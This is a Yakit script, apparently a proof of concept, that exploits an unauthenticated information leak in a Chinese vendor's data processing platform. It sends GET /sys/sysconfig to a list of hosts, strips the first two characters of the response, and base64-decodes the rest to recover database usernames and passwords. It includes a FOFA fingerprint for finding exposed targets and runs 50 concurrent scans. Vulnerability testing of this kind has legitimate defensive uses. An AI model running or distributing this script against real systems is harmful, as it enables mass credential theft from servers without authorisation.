yakit.AutoInitYakit()
loglevel("disable")

# Input your code!
target = cli.Text("target", cli.setHelp("填写url或host,一行一个"), cli.setDefault("http://example.com"), cli.setRequired(true))
cli.check()
targets = str.ParseStringToLines(target)

/* 
重庆中联信息产业有限责任公司下中联数据处理平台存在信息泄漏，允许攻击者在未进行身份验证的情况下获取数据库账号和密码。
*/
#漏洞描述
info = `重庆中联信息产业有限责任公司下中联数据处理平台存在信息泄漏，允许攻击者在未进行身份验证的情况下获取数据库账号密码。去除响应体前两位字符 然后base64解码即可获取配置信息。
fofa:icon_hash="-1384861523" && body="中联数据处理平台`

attack = func(host) {
    defer wg.Done()
    packet = f`GET /sys/sysconfig HTTP/1.1
Host: ${host}
`
    is_https = str.IsTLSServer(host)
    try {
        rsp, req = poc.HTTPEx(packet, poc.connectTimeout(6),poc.https(is_https),poc.redirectTimes(1))~
        header, body = poc.Split(rsp.RawPacket)
        if rsp.GetStatusCode() == 200 && string(body)[:2] == "CL" {
            println(f"${host} 存在信息泄漏！")
            #去除前两位字符 然后base64解码
            data = codec.DecodeBase64(string(body)[2:])~
            #println(string(data))
            
            #漏洞写入数据库
            risk.NewRisk(
                        string(host),
                        risk.severity("high"),
                        risk.title(host+"存在信息泄漏"),
                        risk.description(info),
                        risk.solution("添加对该接口的访问控制"), 
                        risk.request(packet),
                        risk.response(string(body)),
                        risk.details(string(data)),
                        risk.payload('/sys/sysconfig')
                    )

        } else {
            println(f"${host} 不存在该漏洞")
        }
        
    } catch err {
        println(err)
        if "timeout" in err{
            yakit.Info(f"${host} 连接超时")
        }
        if "target machine actively refused it" in err{
            yakit.Info(f"${host} 无法访问此网站")
        }
        if "all tls strategy failed" in err{
            yakit.Info("不支持https协议,尝试http连接")
            attack(host, false)
        }
    }
}

println("****************************程序开始*****************************************")
wg := sync.NewSizedWaitGroup(50)
for target in targets{
    yakit.Info(f"正在测试 ${target}")
    ip, port, _ = str.ParseStringToHostPort(target)
    addr = str.HostPort(ip, port)
    wg.Add(1)
    attack(addr)
}
wg.Wait()
println("****************************程序结束*****************************************")
